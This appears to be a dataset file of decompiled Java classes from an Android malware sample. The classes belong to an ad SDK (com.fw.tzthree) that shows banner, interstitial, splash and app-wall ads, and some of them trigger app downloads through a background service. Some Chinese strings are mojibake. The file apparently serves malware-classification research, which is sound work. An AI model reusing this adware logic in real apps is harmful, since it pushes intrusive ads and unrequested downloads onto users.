"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\ar.code","public class ar implements Runnable {   final FullScreenView a;   public ar(  FullScreenView fullScreenView){     this.a=fullScreenView;   }   @Override public void run(){     TextView textView;     TextView textView2;     TextView textView3;     TextView textView4;     TextView textView5;     TextView textView6;     TextView textView7;     TextView textView8;     int i;     this.a.d=new TextView(this.a.getContext());     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(com.fw.tzthree.d.n.a(this.a.getContext(),85.0f),com.fw.tzthree.d.n.a(this.a.getContext(),30.0f));     layoutParams.addRule(11);     textView=this.a.d;     textView.setLayoutParams(layoutParams);     textView2=this.a.d;     textView2.setBackgroundColor(Color.parseColor(""#88000000""));     textView3=this.a.d;     textView3.setGravity(17);     textView4=this.a.d;     textView4.setTextColor(Color.parseColor(""#F2F2F2""));     textView5=this.a.d;     textView5.setTextSize(15.0f);     textView6=this.a.d;     textView6.setText(com.fw.tzthree.d.j.bY + com.fw.tzthree.d.j.bW);     textView7=this.a.d;     textView7.setOnClickListener(this.a);     FullScreenView fullScreenView=this.a;     textView8=this.a.d;     fullScreenView.addView(textView8);     FullScreenView fullScreenView2=this.a;     i=this.a.i;     fullScreenView2.a(i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\as.code","public class as implements Runnable {   final int a;   final FullScreenView b;   public as(  FullScreenView fullScreenView,  int i){     this.b=fullScreenView;     this.a=i;   }   @Override public void run(){     boolean z;     boolean z2;     z=this.b.k;     if (z) {       return;     }     z2=this.b.j;     if (z2) {       this.b.a(1);     }  else {       this.b.e(""å�¯åŠ¨è‡ªåŠ¨å»¶è¿Ÿ seconds = "" + this.a);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\at.code","public class at implements Runnable {   final FullScreenView a;   public at(  FullScreenView fullScreenView){     this.a=fullScreenView;   }   @Override public void run(){     int i;     boolean z;     i=this.a.i;     if (i > 0) {       this.a.d();       FullScreenView.n(this.a);       this.a.a(1L);     }  else {       z=this.a.j;       if (z) {         this.a.a(1L);       }  else {         this.a.e(""åˆ°æ—¶é—´è‡ªåŠ¨é”€æ¯�"");       }     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\au.code","public class au implements DialogInterface.OnClickListener {   final FullScreenView a;   public au(  FullScreenView fullScreenView){     this.a=fullScreenView;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     this.a.j=false;     this.a.e();     dialogInterface.cancel();     this.a.g();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\av.code","public class av implements Serializable {   private List<TableplaqueAdInfo> a;   public List<TableplaqueAdInfo> a(){     return this.a;   }   public void a(  List<TableplaqueAdInfo> list){     this.a=list;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\aw.code","final class aw implements Runnable {   final Handler a;   public aw(  Handler handler){     this.a=handler;   }   @Override public void run(){     Context context;     InterstitialBusiness a=InterstitialBusiness.a();     context=FwInterstitialManager.a;     a.a(context,this.a,(FwInterstitialListener)null);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\ax.code","final class ax implements Runnable {   final Handler a;   final FwInterstitialListener b;   public ax(  Handler handler,  FwInterstitialListener fwInterstitialListener){     this.a=handler;     this.b=fwInterstitialListener;   }   @Override public void run(){     Context context;     InterstitialBusiness a=InterstitialBusiness.a();     context=FwInterstitialManager.a;     a.a(context,this.a,this.b);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\ay.code","public class ay {   private static String a=""activity_info"";   private static String b=""localactivity"";   private static Class<?> c=null;   public static Class<?> a(  Context context){     if (context == null) {       return null;     }     String string=context.getSharedPreferences(a,0).getString(b,"""");     if (!"""".equals(string)) {       try {         c=Class.forName(string);       }  catch (      ClassNotFoundException e) {         e.printStackTrace();       }     }  else     if (c == null) {       c=a(context,FwMA.class);     }     return c;   }   public static Class<?> a(  Context context,  Class<?> cls){     Class<?> cls2;     try {       ActivityInfo[] activityInfoArr=context.getPackageManager().getPackageInfo(context.getApplicationInfo().packageName,1).activities;       int i=0;       while (true) {         int i2=i;         if (i2 >= activityInfoArr.length) {           break;         }         try {           cls2=Class.forName(activityInfoArr[i2].name);         }  catch (        ClassNotFoundException e) {           e.printStackTrace();         }         if (cls.isAssignableFrom(cls2)) {           return cls2;         }         i=i2 + 1;       }     }  catch (    PackageManager.NameNotFoundException e2) {       e2.printStackTrace();     }     return null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\b.code","public class b implements View.OnClickListener {   final SmartImageView a;   final TableplaqueAdInfo b;   final RelativeLayout.LayoutParams c;   final MyRelativeLayout d;   final Context e;   final AdView f;   public b(  AdView adView,  SmartImageView smartImageView,  TableplaqueAdInfo tableplaqueAdInfo,  RelativeLayout.LayoutParams layoutParams,  MyRelativeLayout myRelativeLayout,  Context context){     this.f=adView;     this.a=smartImageView;     this.b=tableplaqueAdInfo;     this.c=layoutParams;     this.d=myRelativeLayout;     this.e=context;   }   @Override public void onClick(  View view){     Context context;     Context context2;     Context context3;     Context context4;     AutoScrollViewPager autoScrollViewPager;     RelativeLayout a;     AutoScrollViewPager autoScrollViewPager2;     Context context5;     Context context6;     Context context7;     this.a.setClickable(false);     if (this.b.getKind().intValue() == 1) {       context5=this.f.f;       Intent intent=new Intent(context5,(Class<?>)FwWebActivity.class);       intent.putExtra(com.fw.tzthree.b.a.aX,this.b);       intent.putExtra(com.fw.tzthree.b.a.ba,3);       context6=this.f.f;       context6.startActivity(intent);       InterstitialBusiness a2=InterstitialBusiness.a();       context7=this.f.f;       a2.postActionRequest(context7,this.b,4);       return;     }     if (this.b.getKind().intValue() != 2) {       if (3 != this.b.getKind().intValue()) {         if (4 == this.b.getKind().intValue()) {         }         return;       }       com.fw.tzthree.d.r.a(this.e,this.b.getUrl());       InterstitialBusiness a3=InterstitialBusiness.a();       context=this.f.f;       a3.postActionRequest(context,this.b,4);       return;     }     if (this.b.getWifiSwitches() != null) {       context3=this.f.f;       if (com.fw.tzthree.d.aa.a(context3,this.b).getClickDown().isOff()) {         AdView adView=this.f;         context4=this.f.f;         autoScrollViewPager=this.f.h;         a=adView.a(context4,autoScrollViewPager,this.c,this.d,this.b);         this.d.removeView(a);         this.d.addView(a);         autoScrollViewPager2=this.f.h;         autoScrollViewPager2.b();         return;       }     }     AdView adView2=this.f;     context2=this.f.f;     adView2.a(context2,this.b);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\BannerBusiness.code","public class BannerBusiness extends y<BannerAdInfo> {   private static BannerBusiness k;   AutoScrollViewPager a;   com.fw.tzthree.a.a b;   String c;   ViewGroup d;   int e;   float g;   float h;   WindowManager i;   private Long l=30000L;   int f=5000;   public RelativeLayout a(  Context context,  AutoScrollViewPager autoScrollViewPager,  RelativeLayout.LayoutParams layoutParams,  RelativeLayout relativeLayout,  BannerAdInfo bannerAdInfo){     RelativeLayout relativeLayout2=new RelativeLayout(context);     relativeLayout2.setLayoutParams(layoutParams);     relativeLayout2.setBackgroundColor(Color.parseColor(""#aaaaaaaa""));     Button button=new Button(context);     button.setText(""ç«‹å�³ä¸‹è½½"");     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(com.fw.tzthree.d.n.a(context,100.0f),com.fw.tzthree.d.n.a(context,40.0f));     layoutParams2.addRule(13);     button.setLayoutParams(layoutParams2);     button.setBackgroundColor(-256);     button.setTextSize(2,12.0f);     button.setBackgroundDrawable(com.fw.tzthree.d.ac.a(com.fw.tzthree.d.ac.a(Color.parseColor(""#224d1f""),15,false),com.fw.tzthree.d.ac.a(Color.parseColor(""#53bd4c""),15,false)));     button.setTextSize(2,18.0f);     button.setTextColor(com.fw.tzthree.d.ac.a(-1,-7829368));     button.setOnClickListener(new j(this,autoScrollViewPager,relativeLayout,relativeLayout2,context,bannerAdInfo));     relativeLayout2.addView(button);     relativeLayout2.setOnClickListener(new k(this,autoScrollViewPager,relativeLayout,relativeLayout2,context,bannerAdInfo));     return relativeLayout2;   }   public static BannerBusiness a(){     if (k == null) {       k=new BannerBusiness();     }     return k;   }   public void a(  Context context,  BannerAdInfo bannerAdInfo){     Intent intent=new Intent(context,(Class<?>)FwDservice.class);     intent.putExtra(com.fw.tzthree.b.a.aX,bannerAdInfo);     intent.putExtra(com.fw.tzthree.b.a.ba,getAdType());     intent.putExtra(""033C9AA179013A52D68F761D575E5A4A"",1);     context.startService(intent);   }   public void a(  Context context,  Handler handler,  ViewGroup viewGroup,  FwBannerListener fwBannerListener){     this.d=viewGroup;     requestAdList(context,handler,fwBannerListener);   }   @Override protected void a(  com.fw.tzthree.d.f fVar){   }   @Override void a(  BusinessDataContext<BannerAdInfo> businessDataContext){   }   @Override void a(  BusinessDataContext<BannerAdInfo> businessDataContext,  List<BannerAdInfo> list){     boolean z;     BannerAdInfo bannerAdInfo;     DisplayMetrics displayMetrics=new DisplayMetrics();     this.i=(WindowManager)businessDataContext.getContext().getSystemService(""window"");     this.i.getDefaultDisplay().getMetrics(displayMetrics);     float f=displayMetrics.density;     float f2=displayMetrics.widthPixels;     float f3=displayMetrics.heightPixels;     if (f2 <= 320.0f) {       f2=(int)Math.ceil(f2 * f);       f3=(int)Math.ceil(f3 * f);     }     this.i=null;     if (f2 > f3) {       this.h=(float)(f3 * 0.165d);       z=false;     }  else {       this.g=f2;       z=true;     }     Setting setting=getSetting(businessDataContext.getContext(),2);     this.c=setting.getResourcesAddr();     String cacheExpires=setting.getCacheExpires();     this.a=new AutoScrollViewPager(businessDataContext.getContext());     Iterator<BannerAdInfo> it=list.iterator();     while (true) {       if (!it.hasNext()) {         bannerAdInfo=null;         break;       }  else {         bannerAdInfo=it.next();         if (!TextUtils.isEmpty(bannerAdInfo.getBannerImg())) {           break;         }       }     }     if (bannerAdInfo == null) {       return;     }     com.fw.tzthree.d.n.a(businessDataContext.getContext(),this.c + com.fw.tzthree.d.n.a(com.fw.tzthree.d.l.b(businessDataContext.getContext()),bannerAdInfo.getBannerImg())[1],new l(this,z,businessDataContext,list,f,cacheExpires));   }   @Override public com.fw.tzthree.c.d addFilterPipelineNode(  com.fw.tzthree.c.d dVar,  BusinessDataContext businessDataContext){     return dVar.a(new com.fw.tzthree.c.a.e());   }   @Override public int getAdType(){     return 2;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\BoxBusiness.code","public class BoxBusiness extends AppWallBusiness {   private static BoxBusiness a;   private Handler b;   private x c;   private boolean d=false;   private void a(  x xVar){     this.c=xVar;   }   private void a(  boolean z){     this.d=z;   }   public static BoxBusiness b(){     if (a == null) { synchronized (BoxBusiness.class) {         if (a == null) {           a=new BoxBusiness();         }       }     }     return a;   }   private x c(){     return this.c;   }   private boolean d(){     return this.d;   }   public void a(  Context context,  Handler handler,  x xVar,  boolean z){     a(xVar);     a(z);     com.fw.tzthree.c.b.a.a().a(new s(this,context,handler));   }   @Override protected void a(  com.fw.tzthree.d.f fVar){     fVar.a(com.fw.tzthree.b.a.y);     fVar.a(com.fw.tzthree.b.a.z);     fVar.d(com.fw.tzthree.b.a.x);   }   @Override void a(  BusinessDataContext<AppWallAdInfo> businessDataContext){     if (d() || c() == null) {       return;     }     c().a(businessDataContext);   }   @Override void a(  BusinessDataContext<AppWallAdInfo> businessDataContext,  List<AppWallAdInfo> list){     if (d() || c() == null) {       return;     }     c().a(businessDataContext,list);   }   @Override public void init(  Context context,  String str){     super.init(context,str);     if (this.b == null) {       this.b=new Handler();     }     if (TextUtils.isEmpty(com.fw.tzthree.d.z.b(context,""box_da_appkey"",""box_appkey"",com.fw.tzthree.b.a.ak,"""")) && com.fw.tzthree.d.s.c(""sec"",str)) {       com.fw.tzthree.d.z.a(context,""box_da_appkey"",""box_appkey"",com.fw.tzthree.b.a.ak,com.fw.tzthree.b.a.aI);     }   }   @Override public void onNetWorkChange(  Context context,  String str){     super.onNetWorkChange(context,str);     t.a().b(new Handler(),context);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\c.code","public class c extends SmartImageTask.OnCompleteListener {   final ImageView a;   final AdView b;   public c(  AdView adView,  ImageView imageView){     this.b=adView;     this.a=imageView;   }   @Override public void onComplete(){     if (this.a.getVisibility() == 4) {       this.a.setVisibility(0);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\CallbackListener.code","public interface CallbackListener {   void onFailure();   void onSuccess(); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\CustomBusiness.code","public class CustomBusiness extends y<CustomAdInfo> {   private static CustomBusiness a;   private FwCustomRequestListener b;   private FwCustomRequestListener a(){     return this.b;   }   private List<Material> a(  String str,  String str2){     ArrayList arrayList=new ArrayList();     try {       if (!TextUtils.isEmpty(str2)) {         String[] split=str2.split(""\\;"");         if (split.length != 0) {           for (          String str3 : split) {             Material material=new Material();             String[] split2=str3.split(""\\:"");             String str4=split2[0];             String str5=split2[1];             String[] split3=str4.split(""\\*"");             String str6=split3[0];             material.setHeight(Integer.valueOf(Integer.parseInt(split3[1])));             material.setWidth(Integer.valueOf(Integer.parseInt(str6)));             material.setImageUrl(str + str5);             arrayList.add(material);           }         }       }     }  catch (    Exception e) {       e.printStackTrace();     }     return arrayList;   }   private void a(  FwCustomRequestListener fwCustomRequestListener){     this.b=fwCustomRequestListener;   }   public static CustomBusiness getInstence(){     if (a == null) { synchronized (CustomBusiness.class) {         if (a == null) {           a=new CustomBusiness();         }       }     }     return a;   }   @Override protected void a(  com.fw.tzthree.d.f fVar){   }   @Override void a(  BusinessDataContext<CustomAdInfo> businessDataContext){     if (a() != null) {       a().onResponse(null,false);     }   }   @Override void a(  BusinessDataContext<CustomAdInfo> businessDataContext,  List<CustomAdInfo> list){     ArrayList arrayList=new ArrayList();     String resourcesAddr=getInstence().getSetting(businessDataContext.getContext(),7).getResourcesAddr();     if (list == null || list.size() == 0) {       if (a() != null) {         a().onResponse(null,false);         return;       }       return;     }     for (    CustomAdInfo customAdInfo : list) {       FwDiyAdInfo fwDiyAdInfo=new FwDiyAdInfo();       fwDiyAdInfo.setAppId(customAdInfo.getAdId());       fwDiyAdInfo.setAppKind(customAdInfo.getKind());       fwDiyAdInfo.setAppName(customAdInfo.getAppName());       fwDiyAdInfo.setAppSize(customAdInfo.getAppSize());       fwDiyAdInfo.setAppText(customAdInfo.getRecommend());       fwDiyAdInfo.setAppVersion(customAdInfo.getAppVersion());       fwDiyAdInfo.setDescription(customAdInfo.getIntro());       fwDiyAdInfo.setIconUrl(resourcesAddr + customAdInfo.getIcon());       fwDiyAdInfo.setMaterialList(a(resourcesAddr,customAdInfo.getDiyImg()));       arrayList.add(fwDiyAdInfo);     }     if (arrayList.size() == 0) {       if (a() != null) {         a().onResponse(null,false);       }     }  else     if (a() != null) {       a().onResponse(arrayList,true);     }   }   @Override public com.fw.tzthree.c.d addFilterPipelineNode(  com.fw.tzthree.c.d dVar,  BusinessDataContext businessDataContext){     return dVar.a(new com.fw.tzthree.c.a.j());   }   public void getAdList(  Context context,  FwCustomRequestListener fwCustomRequestListener){     a(fwCustomRequestListener);     com.fw.tzthree.c.b.a.a().a(new ab(this,context,new Handler()));   }   @Override public int getAdType(){     return 7;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\CustomRelativelayout$Holder.code","public class CustomRelativelayout$Holder {   final FwCustomRelativelayout a;   private FwDiyAdInfo b;   private CustomRelativelayout$Holder(  FwCustomRelativelayout fwCustomRelativelayout,  FwDiyAdInfo fwDiyAdInfo){     this.a=fwCustomRelativelayout;     this.b=fwDiyAdInfo;   }   public void executeNext(){     CustomAdInfo a;     if (this.b != null && (a=FwCustomRelativelayout.a(this.a,FwCustomRelativelayout.a(this.a))) != null) {       if (this.b.getAppKind().intValue() == 1) {         FwCustomRelativelayout.a(this.a,a);       }  else       if (this.b.getAppKind().intValue() == 2) {         FwCustomRelativelayout.b(this.a,a);       }     }     this.b=null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\d.code","public class d implements View.OnClickListener {   final AdView a;   public d(  AdView adView){     this.a=adView;   }   @Override public void onClick(  View view){     g gVar;     Context context;     gVar=this.a.g;     gVar.a();     context=this.a.f;     context.getSharedPreferences(com.fw.tzthree.b.a.h,0).edit().putInt(com.fw.tzthree.b.a.j,this.a.b).commit();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\e.code","public class e implements View.OnClickListener {   final AutoScrollViewPager a;   final RelativeLayout b;   final RelativeLayout c;   final TableplaqueAdInfo d;   final AdView e;   public e(  AdView adView,  AutoScrollViewPager autoScrollViewPager,  RelativeLayout relativeLayout,  RelativeLayout relativeLayout2,  TableplaqueAdInfo tableplaqueAdInfo){     this.e=adView;     this.a=autoScrollViewPager;     this.b=relativeLayout;     this.c=relativeLayout2;     this.d=tableplaqueAdInfo;   }   @Override public void onClick(  View view){     Context context;     this.a.a();     this.b.removeView(this.c);     AdView adView=this.e;     context=this.e.f;     adView.a(context,this.d);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\f.code","public class f implements View.OnClickListener {   final AutoScrollViewPager a;   final RelativeLayout b;   final RelativeLayout c;   final TableplaqueAdInfo d;   final AdView e;   public f(  AdView adView,  AutoScrollViewPager autoScrollViewPager,  RelativeLayout relativeLayout,  RelativeLayout relativeLayout2,  TableplaqueAdInfo tableplaqueAdInfo){     this.e=adView;     this.a=autoScrollViewPager;     this.b=relativeLayout;     this.c=relativeLayout2;     this.d=tableplaqueAdInfo;   }   @Override public void onClick(  View view){     Context context;     this.a.a();     this.b.removeView(this.c);     InterstitialBusiness a=InterstitialBusiness.a();     context=this.e.f;     a.postActionRequest(context,this.d,4);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\FullScreenBusiness.code","public class FullScreenBusiness extends y<FullScreenAdInfo> {   private static FullScreenBusiness a;   private ac b;   private ac c;   private FullScreenCallBack d;   public static FullScreenBusiness a(){     if (a == null) { synchronized (FullScreenBusiness.class) {         if (a == null) {           a=new FullScreenBusiness();         }       }     }     return a;   }   public void a(  Activity activity,  FwSplashAdListener fwSplashAdListener,  int i,  long j){     if (activity instanceof Activity) {       activity.addContentView(new FullScreenView(activity,fwSplashAdListener,i,j),new ViewGroup.LayoutParams(-1,-1));     }   }   public void a(  Context context,  Handler handler,  CallbackListener callbackListener,  ac acVar,  int i){     if (i == 1) {       a(acVar);     }  else     if (i == 2) {       b(acVar);       callbackListener=b();     }     AdNode adNode=new AdNode();     adNode.setAdType(Integer.valueOf(getAdType()));     adNode.setCategory(Integer.valueOf(i));     a().requestAdList(context,adNode,handler,callbackListener);   }   public void a(  Context context,  FullScreenCallBack fullScreenCallBack,  int i){     a(fullScreenCallBack);     com.fw.tzthree.c.b.a.a().a(new ad(this,context,new Handler(),i));   }   public void a(  FullScreenCallBack fullScreenCallBack){     this.d=fullScreenCallBack;   }   public void a(  ac acVar){     this.b=acVar;   }   @Override protected void a(  com.fw.tzthree.d.f fVar){     fVar.d(com.fw.tzthree.b.a.w);   }   @Override void a(  BusinessDataContext<FullScreenAdInfo> businessDataContext){     if (businessDataContext.getRequestData() == null || businessDataContext.getRequestData().getAd() == null || businessDataContext.getRequestData().getAd().getCategory() == null) {       return;     }     int intValue=businessDataContext.getRequestData().getAd().getCategory().intValue();     if (intValue == 1) {       if (c() != null) {         c().a(businessDataContext);       }     }  else {       if (intValue != 2 || d() == null) {         return;       }       d().a(businessDataContext);     }   }   @Override void a(  BusinessDataContext<FullScreenAdInfo> businessDataContext,  List<FullScreenAdInfo> list){     if (businessDataContext.getRequestData() == null || businessDataContext.getRequestData().getAd() == null || businessDataContext.getRequestData().getAd().getCategory() == null) {       return;     }     int intValue=businessDataContext.getRequestData().getAd().getCategory().intValue();     if (intValue == 1) {       if (c() != null) {         c().a(businessDataContext,list);       }     }  else {       if (intValue != 2 || d() == null) {         return;       }       d().a(businessDataContext,list);     }   }   @Override public com.fw.tzthree.c.d addFilterPipelineNode(  com.fw.tzthree.c.d dVar,  BusinessDataContext businessDataContext){     return dVar.a(new com.fw.tzthree.c.a.q());   }   public FullScreenCallBack b(){     return this.d;   }   public void b(  ac acVar){     this.c=acVar;   }   public ac c(){     return this.b;   }   public ac d(){     return this.c;   }   @Override public int getAdType(){     return 6;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\FullScreenCallBack.code","public interface FullScreenCallBack extends CallbackListener { } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\FullScreenView.code","public class FullScreenView extends RelativeLayout implements View.OnClickListener {   private FwSplashAdListener a;   private SmartImageView b;   private TextView c;   private TextView d;   private FullScreenAdInfo e;   private SmartImageTask.OnCompleteHandler f;   private Setting g;   private int h;   private int i;   private boolean j;   private boolean k;   private long l;   private AlphaAnimation m;   private long n;   private boolean o;   private boolean p;   private boolean q;   private boolean r;   private SmartImageTask s;   private String t;   public FullScreenView(  Context context){     super(context);     this.i=3;     this.n=5000L;     this.o=false;     this.p=false;     this.q=false;     this.r=true;     a(""5556"");   }   public FullScreenView(  Context context,  FwSplashAdListener fwSplashAdListener,  int i,  long j){     super(context);     this.i=3;     this.n=5000L;     this.o=false;     this.p=false;     this.q=false;     this.r=true;     this.a=fwSplashAdListener;     this.h=i;     this.n=j;     a(""timeOut"");   }   public FullScreenView(  Context context,  FwSplashAdListener fwSplashAdListener,  int i,  long j,  boolean z,  String str,  FullScreenAdInfo fullScreenAdInfo){     super(context);     this.i=3;     this.n=5000L;     this.o=false;     this.p=false;     this.q=false;     this.r=true;     this.a=fwSplashAdListener;     this.h=i;     if (j > 2000) {       this.n=j;     }     this.r=z;     this.t=str;     this.e=fullScreenAdInfo;     this.i=fullScreenAdInfo.getShowTime().intValue();     a(""timeOut"");   }   private void a(){     h();     this.f=new am(this);     com.fw.tzthree.c.b.a.a().a(new an(this,new Handler()));     new Handler().postDelayed(new ap(this),this.n);   }   public void a(  int i){     new Handler().postDelayed(new as(this,i),i * 1000);   }   public void a(  long j){     new Handler().postDelayed(new at(this),1000 * j);   }   public void a(  Bitmap bitmap){     if (this.h == 288) {       b();     }  else     if (this.h == 289) {       c();     }     FullScreenBusiness.a().postActionRequest(getContext(),this.e,3);     if (getContext().getResources().getConfiguration().orientation == 2) {       bitmap=com.fw.tzthree.d.n.a(bitmap,-90.0f);     }     this.b.setImageBitmap(bitmap);     this.m=new AlphaAnimation(0.0f,1.0f);     this.m.setDuration(1L);     startAnimation(this.m);     this.q=false;   }   private void a(  String str){     this.l=System.currentTimeMillis();     setLayoutParams(new RelativeLayout.LayoutParams(-1,-1));     this.b=new SmartImageView(getContext());     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-1,-1);     layoutParams.addRule(15);     this.b.setScaleType(ImageView.ScaleType.CENTER_CROP);     this.b.setLayoutParams(layoutParams);     this.b.setOnClickListener(this);     this.c=new TextView(getContext());     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(com.fw.tzthree.d.n.a(getContext(),85.0f),com.fw.tzthree.d.n.a(getContext(),30.0f));     layoutParams2.addRule(11);     this.c.setLayoutParams(layoutParams2);     this.c.setBackgroundColor(Color.parseColor(""#88000000""));     this.c.setGravity(17);     this.c.setTextColor(Color.parseColor(""#F2F2F2""));     this.c.setTextSize(18.0f);     addView(this.b);     if (this.r) {       a();     }  else {       com.fw.tzthree.d.n.b(getContext(),this.t,new ag(this));     }   }   private void b(){     new Handler().postDelayed(new aq(this),0L);     a(1L);   }   private void b(  String str){     this.j=true;     AlertDialog.Builder builder=new AlertDialog.Builder(getContext());     builder.setMessage(com.fw.tzthree.d.j.cc + str).setCancelable(false).setPositiveButton(com.fw.tzthree.d.j.cb,new ah(this)).setNegativeButton(com.fw.tzthree.d.j.ca,new au(this));     builder.create().show();   }   private void c(){     if (getContext() != null) {       new Handler().postDelayed(new ar(this),0L);     }   }   private void c(  String str){     this.j=true;     AlertDialog.Builder builder=new AlertDialog.Builder(getContext());     builder.setMessage(com.fw.tzthree.d.j.cd + str + com.fw.tzthree.d.j.ce).setCancelable(false).setPositiveButton(com.fw.tzthree.d.j.cb,new aj(this)).setNegativeButton(com.fw.tzthree.d.j.ca,new ai(this));     builder.create().show();   }   public void d(){     if (this.c != null) {       SpannableStringBuilder spannableStringBuilder=new SpannableStringBuilder(com.fw.tzthree.d.j.bW + this.i + com.fw.tzthree.d.j.bX);       spannableStringBuilder.setSpan(new ForegroundColorSpan(-65536),com.fw.tzthree.d.j.bW.length(),com.fw.tzthree.d.j.bW.length() + 1,33);       this.c.setText(spannableStringBuilder);     }   }   public synchronized void d(  String str){     long currentTimeMillis=System.currentTimeMillis();     if (currentTimeMillis - this.l <= 2000) {       new Handler().postDelayed(new ak(this,str),2020 - (currentTimeMillis - this.l));     }  else     if (this.a != null && this.a != null) {       this.a.onSplashLoadFailed();     }   }   public void e(){     FullScreenBusiness.a().postActionRequest(getContext(),this.e,4);   }   public void e(  String str){     long currentTimeMillis=System.currentTimeMillis();     if (currentTimeMillis - this.l <= 2000) {       new Handler().postDelayed(new al(this),2020 - (currentTimeMillis - this.l));     }  else     if (this.a != null) {       this.a.onSplashDismiss();     }   }   public void f(){     e();     Intent intent=new Intent(getContext(),(Class<?>)FwWebActivity.class);     intent.putExtra(com.fw.tzthree.b.a.aX,this.e);     intent.putExtra(com.fw.tzthree.b.a.ba,6);     intent.setFlags(268435456);     getContext().startActivity(intent);   }   public void g(){     if (this.q) {       return;     }     this.q=true;     if (this.e == null || this.e.getKind().intValue() != 2) {       return;     }     Intent intent=new Intent(getContext(),(Class<?>)FwDservice.class);     intent.putExtra(com.fw.tzthree.b.a.aX,this.e);     intent.putExtra(com.fw.tzthree.b.a.ba,6);     intent.putExtra(""033C9AA179013A52D68F761D575E5A4A"",1);     getContext().startService(intent);   }   private void h(){     if (this.a != null) {       this.a.onSplashPresent();     }   }   public static int n(  FullScreenView fullScreenView){     int i=fullScreenView.i;     fullScreenView.i=i - 1;     return i;   }   @Override public void onClick(  View view){     if (view != this.b) {       if (view == this.d) {         this.k=true;         e(""ç‚¹å‡»å…³é—­å¹¿å‘ŠæŒ‰é’®äº†"");         return;       }       return;     }     if (getContext() == null || this.e == null) {       return;     }     if (!com.fw.tzthree.d.e.a(getContext())) {       Toast.makeText(getContext(),com.fw.tzthree.d.j.bZ,1).show();       return;     }     AdSwitches a=com.fw.tzthree.d.aa.a(getContext(),this.e);     if (this.e.getKind().intValue() == 2) {       if (a == null || a.getClickDown() == null) {         return;       }       if (a.getClickDown().isOn()) {         g();         return;       }  else {         b(this.e.getAppName());         return;       }     }     if (this.e.getKind().intValue() != 1) {       if (this.e.getKind().intValue() == 3) {         e();         com.fw.tzthree.d.r.a(getContext(),this.e.getUrl());         return;       }       return;     }     if (a == null || a.getClickDown() == null) {       return;     }     if (a.getClickDown().isOn()) {       f();     }  else {       c(this.e.getAppName());     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\FwAppWallManager.code","public class FwAppWallManager {   public static void init(  Context context){     AppWallBusiness.a().init(context);   }   public static void init(  Context context,  String str){     AppWallBusiness.a().init(context,str);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\FwBannerListener.code","public interface FwBannerListener extends CallbackListener { } "
